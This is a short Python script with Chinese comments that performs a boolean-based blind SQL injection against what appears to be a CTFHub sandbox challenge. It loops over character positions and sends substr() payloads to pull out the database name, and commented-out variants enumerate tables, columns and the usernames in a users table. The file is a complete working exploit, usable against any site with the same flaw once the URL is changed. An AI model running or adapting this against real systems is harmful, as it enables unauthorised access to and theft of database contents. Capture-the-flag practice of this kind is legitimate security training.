import requests

#设定测试URL
url = "http://challenge-1c98fdcc54d18e5c.sandbox.ctfhub.com:10800/?id=1 and "
#盲注成功标识
success_mark = "ID"
data = ""

for i in range(1,50):
    for j in range(31,128):
        j = (128+31)-j
        str_ascii=chr(j)
        #获得数据库名payload
        payload = "substr(database(),%s,1)='%s'--+" %(str(i),str(str_ascii))
        #获得表名payload
        #payload = "substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%s,1)='%s'--+" %(str(i),str(str_ascii))
        #获得表中列名\自己改表名，若果自己动手的可以做一个def
        #payload = "substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),%s,1)='%s'--+" %(str(i),str(str_ascii))
        #获得表中数据
        #payload = "substr((select group_concat(username) from users),%s,1)='%s'--+" %(str(i),str(str_ascii))
        new_url=url+payload
        #获得页面源码信息
        str_get = requests.get(new_url)
        if success_mark in str_get.text:
            if str_ascii=="+":
                exit()
            else:
                data += str_ascii
                print(data)
                break

